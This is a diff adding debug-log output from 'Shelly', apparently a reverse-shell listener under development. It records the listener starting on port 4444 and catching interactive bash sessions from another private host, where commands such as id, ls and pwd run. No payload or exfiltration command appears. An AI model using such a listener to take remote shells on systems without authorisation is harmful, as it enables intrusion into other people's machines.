@@ -77,3 +77,806 @@ index.ht...
 2026/03/23 22:18:12 ui.go:287: [UI] Run command: LHOST=10.0.0.179, LPORT=4444
 2026/03/23 22:18:12 ui.go:148: [UI] StartListenerMsg received: host=10.0.0.179 port=4444
 2026/03/23 22:18:12 ui.go:152: [UI] OnStartListener is nil
+2026/03/23 22:21:40 main.go:168: Bubbletea program ended
+2026/03/23 22:21:48 main.go:36: === Shelly started with args: [./shelly -p 4444]
+2026/03/23 22:21:50 main.go:95: [MAIN] Selected interface: 10.0.0.179
+2026/03/23 22:21:50 main.go:162: Starting bubbletea program
+2026/03/23 22:21:52 ui.go:287: [UI] Run command: LHOST=10.0.0.179, LPORT=4444
+2026/03/23 22:21:52 ui.go:148: [UI] StartListenerMsg received: host=10.0.0.179 port=4444
+2026/03/23 22:21:52 main.go:124: [MAIN] Starting listener on 10.0.0.179:4444
+2026/03/23 22:21:52 listener.go:43: [LISTENER] Listening on 10.0.0.179:4444
+2026/03/23 22:21:52 main.go:137: [MAIN] Listener started successfully
+2026/03/23 22:22:00 listener.go:60: [LISTENER] New session 1 from 10.0.20.3:47942
+2026/03/23 22:24:51 main.go:36: === Shelly started with args: [./shelly -p 4444]
+2026/03/23 22:24:53 main.go:95: [MAIN] Selected interface: 10.0.0.179
+2026/03/23 22:24:53 main.go:162: Starting bubbletea program
+2026/03/23 22:25:09 ui.go:287: [UI] Run command: LHOST=10.0.0.179, LPORT=4444
+2026/03/23 22:25:09 ui.go:148: [UI] StartListenerMsg received: host=10.0.0.179 port=4444
+2026/03/23 22:25:09 main.go:124: [MAIN] Starting listener on 10.0.0.179:4444
+2026/03/23 22:25:09 listener.go:43: [LISTENER] Listening on 10.0.0.179:4444
+2026/03/23 22:25:09 main.go:137: [MAIN] Listener started successfully
+2026/03/23 22:25:19 listener.go:60: [LISTENER] New session 1 from 10.0.20.3:55144
+2026/03/23 22:25:19 ui.go:141: [UI] New session 1 from 10.0.20.3:55144
+2026/03/23 22:25:20 ui.go:417: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:25:20 ui.go:130: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:25:24 ui.go:194: [UI] Session 1 input: id
+2026/03/23 22:25:24 ui.go:417: [DEBUG] Session 1 read 2 bytes
+2026/03/23 22:25:24 ui.go:130: [UI] Session data (2 bytes): id
+2026/03/23 22:25:24 ui.go:417: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:25:24 ui.go:130: [UI] Session data (1 bytes): 
+2026/03/23 22:25:24 ui.go:417: [DEBUG] Session 1 read 92 bytes
+2026/03/23 22:25:24 ui.go:130: [UI] Session data (92 bytes): uid=1000(mtfd) gid=1000(mtfd) groups=1000(mtfd),27(sudo),988(ollama),990(docker),10001(nas)
+2026/03/23 22:25:24 ui.go:417: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:25:24 ui.go:130: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:31:48 ui.go:194: [UI] Session 1 input: help
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 4 bytes
+2026/03/23 22:31:48 ui.go:130: [UI] Session data (4 bytes): help
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:31:48 ui.go:130: [UI] Session data (1 bytes): 
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:31:48 ui.go:130: [UI] Session data (58 bytes): GNU bash, version 5.2.21(1)-release (x86_64-pc-linux-gnu)
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 1024 bytes
+2026/03/23 22:31:48 ui.go:128: [UI] Session data (1024 bytes): These shell commands are defined internally.  Type `help' to see this list.
+Type `help name' to find...
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 441 bytes
+2026/03/23 22:31:48 ui.go:128: [UI] Session data (441 bytes):                                                      kill [-s sigspec | -n signum | -sigspec] pid | ...
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 140 bytes
+2026/03/23 22:31:48 ui.go:128: [UI] Session data (140 bytes):  alias [-p] [name[=value] ... ]                                                                     ...
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 1024 bytes
+2026/03/23 22:31:48 ui.go:128: [UI] Session data (1024 bytes):  bg [job_spec ...]                                                                                  ...
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 1024 bytes
+2026/03/23 22:31:48 ui.go:128: [UI] Session data (1024 bytes): -N nchars] [-p prompt] [-t timeout] [-u fd] [name ...]
+ cd [-L|[-P [-e]] [-@]] [dir]                ...
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 1024 bytes
+2026/03/23 22:31:48 ui.go:128: [UI] Session data (1024 bytes):                                                                                shift [n]
+ coproc [NA...
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 1024 bytes
+2026/03/23 22:31:48 ui.go:128: [UI] Session data (1024 bytes):                                                                                trap [-lp] [[arg] sig...
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 1024 bytes
+2026/03/23 22:31:48 ui.go:128: [UI] Session data (1024 bytes):                                                unalias [-a] name [name ...]
+ for NAME [in WORDS ... ...
+2026/03/23 22:31:48 ui.go:417: [DEBUG] Session 1 read 87 bytes
+2026/03/23 22:31:48 ui.go:130: [UI] Session data (87 bytes):               { COMMANDS ; }
+]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:32:41 main.go:168: Bubbletea program ended
+2026/03/23 22:32:46 main.go:36: === Shelly started with args: [./shelly -p 4444]
+2026/03/23 22:32:48 main.go:95: [MAIN] Selected interface: 10.0.0.179
+2026/03/23 22:32:48 main.go:162: Starting bubbletea program
+2026/03/23 22:32:53 ui.go:348: [UI] Run command: LHOST=10.0.0.179, LPORT=4444
+2026/03/23 22:32:53 ui.go:151: [UI] StartListenerMsg received: host=10.0.0.179 port=4444
+2026/03/23 22:32:53 main.go:124: [MAIN] Starting listener on 10.0.0.179:4444
+2026/03/23 22:32:53 listener.go:43: [LISTENER] Listening on 10.0.0.179:4444
+2026/03/23 22:32:53 main.go:137: [MAIN] Listener started successfully
+2026/03/23 22:32:59 listener.go:60: [LISTENER] New session 1 from 10.0.20.3:45652
+2026/03/23 22:32:59 ui.go:143: [UI] New session 1 from 10.0.20.3:45652
+2026/03/23 22:32:59 ui.go:479: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:32:59 ui.go:132: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:33:02 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:02 ui.go:132: [UI] Session data (1 bytes): l
+2026/03/23 22:33:03 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:03 ui.go:132: [UI] Session data (1 bytes): s
+2026/03/23 22:33:04 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:04 ui.go:132: [UI] Session data (1 bytes): 
+2026/03/23 22:33:04 ui.go:479: [DEBUG] Session 1 read 142 bytes
+2026/03/23 22:33:04 ui.go:130: [UI] Session data (142 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 22:33:04 ui.go:479: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:33:04 ui.go:132: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:33:06 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:06 ui.go:132: [UI] Session data (1 bytes): p
+2026/03/23 22:33:06 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:06 ui.go:132: [UI] Session data (1 bytes): w
+2026/03/23 22:33:06 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:06 ui.go:132: [UI] Session data (1 bytes): d
+2026/03/23 22:33:07 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:07 ui.go:132: [UI] Session data (1 bytes): 
+2026/03/23 22:33:07 ui.go:479: [DEBUG] Session 1 read 69 bytes
+2026/03/23 22:33:07 ui.go:132: [UI] Session data (69 bytes): /home/mtfd
+]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:33:09 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:33:09 ui.go:132: [UI] Session data (3 bytes): pwd
+2026/03/23 22:33:09 ui.go:479: [DEBUG] Session 1 read 6 bytes
+2026/03/23 22:33:09 ui.go:132: [UI] Session data (6 bytes): [K
+2026/03/23 22:33:10 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:33:10 ui.go:132: [UI] Session data (3 bytes): pwd
+2026/03/23 22:33:10 ui.go:479: [DEBUG] Session 1 read 9 bytes
+2026/03/23 22:33:10 ui.go:132: [UI] Session data (9 bytes): [1Pls
+2026/03/23 22:33:11 ui.go:479: [DEBUG] Session 1 read 6 bytes
+2026/03/23 22:33:11 ui.go:132: [UI] Session data (6 bytes): help
+2026/03/23 22:33:12 ui.go:479: [DEBUG] Session 1 read 10 bytes
+2026/03/23 22:33:12 ui.go:132: [UI] Session data (10 bytes): [2Pid
+2026/03/23 22:33:12 ui.go:479: [DEBUG] Session 1 read 9 bytes
+2026/03/23 22:33:12 ui.go:132: [UI] Session data (9 bytes): [1@pwd
+2026/03/23 22:33:12 ui.go:479: [DEBUG] Session 1 read 9 bytes
+2026/03/23 22:33:12 ui.go:132: [UI] Session data (9 bytes): [1Pls
+2026/03/23 22:33:12 ui.go:479: [DEBUG] Session 1 read 30 bytes
+2026/03/23 22:33:12 ui.go:132: [UI] Session data (30 bytes): sudo systemctl status ollama
+2026/03/23 22:33:13 ui.go:479: [DEBUG] Session 1 read 33 bytes
+2026/03/23 22:33:13 ui.go:132: [UI] Session data (33 bytes): ls[K
+2026/03/23 22:33:13 ui.go:479: [DEBUG] Session 1 read 5 bytes
+2026/03/23 22:33:13 ui.go:132: [UI] Session data (5 bytes): pwd
+2026/03/23 22:33:13 ui.go:479: [DEBUG] Session 1 read 9 bytes
+2026/03/23 22:33:13 ui.go:132: [UI] Session data (9 bytes): [1Pid
+2026/03/23 22:33:13 ui.go:479: [DEBUG] Session 1 read 6 bytes
+2026/03/23 22:33:13 ui.go:132: [UI] Session data (6 bytes): help
+2026/03/23 22:33:13 ui.go:479: [DEBUG] Session 1 read 10 bytes
+2026/03/23 22:33:13 ui.go:132: [UI] Session data (10 bytes): [2Pls
+2026/03/23 22:33:14 ui.go:479: [DEBUG] Session 1 read 5 bytes
+2026/03/23 22:33:14 ui.go:132: [UI] Session data (5 bytes): pwd
+2026/03/23 22:33:15 ui.go:479: [DEBUG] Session 1 read 6 bytes
+2026/03/23 22:33:15 ui.go:132: [UI] Session data (6 bytes): [K
+2026/03/23 22:33:15 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:15 ui.go:132: [UI] Session data (1 bytes): 
+2026/03/23 22:33:15 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:33:15 ui.go:132: [UI] Session data (3 bytes): pwd
+2026/03/23 22:33:16 ui.go:479: [DEBUG] Session 1 read 6 bytes
+2026/03/23 22:33:16 ui.go:132: [UI] Session data (6 bytes): [K
+2026/03/23 22:33:17 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:17 ui.go:132: [UI] Session data (1 bytes): l
+2026/03/23 22:33:17 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:17 ui.go:132: [UI] Session data (1 bytes): s
+2026/03/23 22:33:17 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:17 ui.go:132: [UI] Session data (1 bytes): 
+2026/03/23 22:33:17 ui.go:479: [DEBUG] Session 1 read 142 bytes
+2026/03/23 22:33:17 ui.go:130: [UI] Session data (142 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 22:33:17 ui.go:479: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:33:17 ui.go:132: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:33:21 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:21 ui.go:132: [UI] Session data (1 bytes): !
+2026/03/23 22:33:22 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:22 ui.go:132: [UI] Session data (1 bytes): s
+2026/03/23 22:33:22 ui.go:479: [DEBUG] Session 1 read 6 bytes
+2026/03/23 22:33:22 ui.go:132: [UI] Session data (6 bytes):   
+2026/03/23 22:33:38 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:33:38 ui.go:132: [UI] Session data (1 bytes): p
+2026/03/23 22:33:39 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:33:39 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:35:45 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:45 ui.go:132: [UI] Session data (1 bytes): p
+2026/03/23 22:35:45 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:45 ui.go:132: [UI] Session data (1 bytes): w
+2026/03/23 22:35:45 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:45 ui.go:132: [UI] Session data (1 bytes): d
+2026/03/23 22:35:45 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:45 ui.go:132: [UI] Session data (1 bytes): 
+2026/03/23 22:35:45 ui.go:479: [DEBUG] Session 1 read 69 bytes
+2026/03/23 22:35:45 ui.go:132: [UI] Session data (69 bytes): /home/mtfd
+]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:35:48 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:48 ui.go:132: [UI] Session data (1 bytes): h
+2026/03/23 22:35:48 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:48 ui.go:132: [UI] Session data (1 bytes): o
+2026/03/23 22:35:49 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:35:49 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:35:49 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:35:49 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:35:49 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:49 ui.go:132: [UI] Session data (1 bytes): w
+2026/03/23 22:35:49 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:49 ui.go:132: [UI] Session data (1 bytes): h
+2026/03/23 22:35:49 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:49 ui.go:132: [UI] Session data (1 bytes): o
+2026/03/23 22:35:50 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:50 ui.go:132: [UI] Session data (1 bytes):  
+2026/03/23 22:35:50 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:50 ui.go:132: [UI] Session data (1 bytes): a
+2026/03/23 22:35:50 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:50 ui.go:132: [UI] Session data (1 bytes): m
+2026/03/23 22:35:50 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:50 ui.go:132: [UI] Session data (1 bytes): i
+2026/03/23 22:35:51 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:35:51 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:35:51 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:35:51 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:35:51 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:35:51 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:35:51 ui.go:479: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:35:51 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:35:51 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:51 ui.go:132: [UI] Session data (1 bytes): a
+2026/03/23 22:35:52 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:52 ui.go:132: [UI] Session data (1 bytes): m
+2026/03/23 22:35:52 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:52 ui.go:132: [UI] Session data (1 bytes): i
+2026/03/23 22:35:53 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:53 ui.go:132: [UI] Session data (1 bytes):  
+2026/03/23 22:35:53 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:35:53 ui.go:132: [UI] Session data (1 bytes): 
+2026/03/23 22:35:53 ui.go:479: [DEBUG] Session 1 read 5 bytes
+2026/03/23 22:35:53 ui.go:132: [UI] Session data (5 bytes): mtfd
+2026/03/23 22:35:53 ui.go:479: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:35:53 ui.go:132: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:36:11 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:36:11 ui.go:132: [UI] Session data (1 bytes): i
+2026/03/23 22:36:11 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:36:11 ui.go:132: [UI] Session data (1 bytes): d
+2026/03/23 22:36:11 ui.go:479: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:36:11 ui.go:132: [UI] Session data (1 bytes): 
+2026/03/23 22:36:11 ui.go:479: [DEBUG] Session 1 read 92 bytes
+2026/03/23 22:36:11 ui.go:132: [UI] Session data (92 bytes): uid=1000(mtfd) gid=1000(mtfd) groups=1000(mtfd),27(sudo),988(ollama),990(docker),10001(nas)
+2026/03/23 22:36:11 ui.go:479: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:36:11 ui.go:132: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:38:15 main.go:168: Bubbletea program ended
+2026/03/23 22:38:21 main.go:36: === Shelly started with args: [./shelly -p 4444]
+2026/03/23 22:38:22 main.go:95: [MAIN] Selected interface: 10.0.0.179
+2026/03/23 22:38:22 main.go:162: Starting bubbletea program
+2026/03/23 22:38:24 ui.go:348: [UI] Run command: LHOST=10.0.0.179, LPORT=4444
+2026/03/23 22:38:24 ui.go:151: [UI] StartListenerMsg received: host=10.0.0.179 port=4444
+2026/03/23 22:38:24 main.go:124: [MAIN] Starting listener on 10.0.0.179:4444
+2026/03/23 22:38:24 listener.go:43: [LISTENER] Listening on 10.0.0.179:4444
+2026/03/23 22:38:24 main.go:137: [MAIN] Listener started successfully
+2026/03/23 22:38:37 listener.go:60: [LISTENER] New session 1 from 10.0.20.3:35972
+2026/03/23 22:38:37 ui.go:143: [UI] New session 1 from 10.0.20.3:35972
+2026/03/23 22:38:46 ui.go:479: [DEBUG] Session 1 read 142 bytes
+2026/03/23 22:38:46 ui.go:130: [UI] Session data (142 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 22:38:48 ui.go:479: [DEBUG] Session 1 read 11 bytes
+2026/03/23 22:38:48 ui.go:132: [UI] Session data (11 bytes): /home/mtfd
+2026/03/23 22:38:51 ui.go:483: [DEBUG] Session 1 read error: EOF
+2026/03/23 22:38:51 ui.go:132: [UI] Session data (37 bytes): 
+[!] Session 1 connection closed: EOF
+2026/03/23 22:39:13 listener.go:60: [LISTENER] New session 2 from 10.0.20.3:34858
+2026/03/23 22:39:13 ui.go:143: [UI] New session 2 from 10.0.20.3:34858
+2026/03/23 22:39:13 ui.go:479: [DEBUG] Session 2 read 58 bytes
+2026/03/23 22:39:13 ui.go:132: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:39:15 ui.go:479: [DEBUG] Session 2 read 1 bytes
+2026/03/23 22:39:15 ui.go:132: [UI] Session data (1 bytes): s
+2026/03/23 22:39:16 ui.go:479: [DEBUG] Session 2 read 3 bytes
+2026/03/23 22:39:16 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:39:16 ui.go:479: [DEBUG] Session 2 read 1 bytes
+2026/03/23 22:39:16 ui.go:132: [UI] Session data (1 bytes): l
+2026/03/23 22:39:16 ui.go:479: [DEBUG] Session 2 read 1 bytes
+2026/03/23 22:39:16 ui.go:132: [UI] Session data (1 bytes): s
+2026/03/23 22:39:16 ui.go:479: [DEBUG] Session 2 read 1 bytes
+2026/03/23 22:39:16 ui.go:132: [UI] Session data (1 bytes): 
+2026/03/23 22:39:16 ui.go:479: [DEBUG] Session 2 read 142 bytes
+2026/03/23 22:39:16 ui.go:130: [UI] Session data (142 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 22:39:16 ui.go:479: [DEBUG] Session 2 read 58 bytes
+2026/03/23 22:39:16 ui.go:132: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:39:18 ui.go:479: [DEBUG] Session 2 read 1 bytes
+2026/03/23 22:39:18 ui.go:132: [UI] Session data (1 bytes): !
+2026/03/23 22:39:18 ui.go:479: [DEBUG] Session 2 read 1 bytes
+2026/03/23 22:39:18 ui.go:132: [UI] Session data (1 bytes): s
+2026/03/23 22:39:18 ui.go:479: [DEBUG] Session 2 read 6 bytes
+2026/03/23 22:39:18 ui.go:132: [UI] Session data (6 bytes):   
+2026/03/23 22:39:24 ui.go:479: [DEBUG] Session 2 read 1 bytes
+2026/03/23 22:39:24 ui.go:132: [UI] Session data (1 bytes): l
+2026/03/23 22:39:25 ui.go:479: [DEBUG] Session 2 read 1 bytes
+2026/03/23 22:39:25 ui.go:132: [UI] Session data (1 bytes): s
+2026/03/23 22:39:25 ui.go:479: [DEBUG] Session 2 read 3 bytes
+2026/03/23 22:39:25 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:39:26 ui.go:479: [DEBUG] Session 2 read 3 bytes
+2026/03/23 22:39:26 ui.go:132: [UI] Session data (3 bytes):  
+2026/03/23 22:39:57 ui.go:479: [DEBUG] Session 2 read 1 bytes
+2026/03/23 22:39:57 ui.go:132: [UI] Session data (1 bytes): 
+2026/03/23 22:39:57 ui.go:479: [DEBUG] Session 2 read 58 bytes
+2026/03/23 22:39:57 ui.go:132: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:39:59 main.go:168: Bubbletea program ended
+2026/03/23 22:40:05 main.go:36: === Shelly started with args: [./shelly -p 4444]
+2026/03/23 22:40:07 main.go:95: [MAIN] Selected interface: 10.0.0.179
+2026/03/23 22:40:07 main.go:162: Starting bubbletea program
+2026/03/23 22:40:18 ui.go:361: [UI] Run command: LHOST=10.0.0.179, LPORT=4444
+2026/03/23 22:40:18 ui.go:152: [UI] StartListenerMsg received: host=10.0.0.179 port=4444
+2026/03/23 22:40:18 main.go:124: [MAIN] Starting listener on 10.0.0.179:4444
+2026/03/23 22:40:18 listener.go:43: [LISTENER] Listening on 10.0.0.179:4444
+2026/03/23 22:40:18 main.go:137: [MAIN] Listener started successfully
+2026/03/23 22:40:20 listener.go:60: [LISTENER] New session 1 from 10.0.20.3:43228
+2026/03/23 22:40:20 ui.go:144: [UI] New session 1 from 10.0.20.3:43228
+2026/03/23 22:40:20 ui.go:492: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:40:20 ui.go:133: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:40:23 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:23 ui.go:133: [UI] Session data (1 bytes): l
+2026/03/23 22:40:23 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:23 ui.go:133: [UI] Session data (1 bytes): s
+2026/03/23 22:40:23 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:23 ui.go:133: [UI] Session data (1 bytes): 
+2026/03/23 22:40:23 ui.go:492: [DEBUG] Session 1 read 142 bytes
+2026/03/23 22:40:23 ui.go:131: [UI] Session data (142 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 22:40:23 ui.go:492: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:40:23 ui.go:133: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:40:25 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:25 ui.go:133: [UI] Session data (1 bytes): p
+2026/03/23 22:40:25 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:25 ui.go:133: [UI] Session data (1 bytes): w
+2026/03/23 22:40:25 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:25 ui.go:133: [UI] Session data (1 bytes): d
+2026/03/23 22:40:25 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:25 ui.go:133: [UI] Session data (1 bytes): 
+2026/03/23 22:40:25 ui.go:492: [DEBUG] Session 1 read 11 bytes
+2026/03/23 22:40:25 ui.go:133: [UI] Session data (11 bytes): /home/mtfd
+2026/03/23 22:40:25 ui.go:492: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:40:25 ui.go:133: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:40:27 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:27 ui.go:133: [UI] Session data (1 bytes): !
+2026/03/23 22:40:29 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:29 ui.go:133: [UI] Session data (1 bytes): s
+2026/03/23 22:40:29 ui.go:492: [DEBUG] Session 1 read 6 bytes
+2026/03/23 22:40:29 ui.go:133: [UI] Session data (6 bytes):   
+2026/03/23 22:40:36 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:36 ui.go:133: [UI] Session data (1 bytes): l
+2026/03/23 22:40:36 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:36 ui.go:133: [UI] Session data (1 bytes): s
+2026/03/23 22:40:37 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:37 ui.go:133: [UI] Session data (1 bytes): 
+2026/03/23 22:40:37 ui.go:492: [DEBUG] Session 1 read 142 bytes
+2026/03/23 22:40:37 ui.go:131: [UI] Session data (142 bytes): NVIDIA-Linux-x86_64-580.126.18.run
+cloudflared.deb
+cuda-samples
+deezer
+dev
+docker
+go
+godeez
+index.ht...
+2026/03/23 22:40:37 ui.go:492: [DEBUG] Session 1 read 58 bytes
+2026/03/23 22:40:37 ui.go:133: [UI] Session data (58 bytes): ]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:40:40 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:40 ui.go:133: [UI] Session data (1 bytes): p
+2026/03/23 22:40:40 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:40 ui.go:133: [UI] Session data (1 bytes): w
+2026/03/23 22:40:40 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:40 ui.go:133: [UI] Session data (1 bytes): d
+2026/03/23 22:40:41 ui.go:492: [DEBUG] Session 1 read 1 bytes
+2026/03/23 22:40:41 ui.go:133: [UI] Session data (1 bytes): 
+2026/03/23 22:40:41 ui.go:492: [DEBUG] Session 1 read 69 bytes
+2026/03/23 22:40:41 ui.go:133: [UI] Session data (69 bytes): /home/mtfd
+]0;mtfd@goose: ~[01;32mmtfd@goose[00m:[01;34m~[00m$ 
+2026/03/23 22:40:42 ui.go:492: [DEBUG] Session 1 read 3 bytes
+2026/03/23 22:40:42 ui.go:133: [UI] Session data (3 bytes): pwd
+2026/03/23 22:40:43 ui.go:492: [DEBUG] Session 1 read 9 bytes
+2026/03/23 22:40:43 ui.go:133: [UI] Session data (9 bytes): [1Pls
+2026/03/23 22:40:43 ui.go:492: [DEBUG] Session 1 read 5 bytes
+2026/03/23 22:40:43 ui.go:133: [UI] Session data (5 bytes): pwd
+2026/03/23 22:40:43 ui.go:492: [DEBUG] Session 1 read 9 bytes
+2026/03/23 22:40:43 ui.go:133: [UI] Session data (9 bytes): [1Pls
+2026/03/23 22:40:44 ui.go:492: [DEBUG] Session 1 read 5 bytes
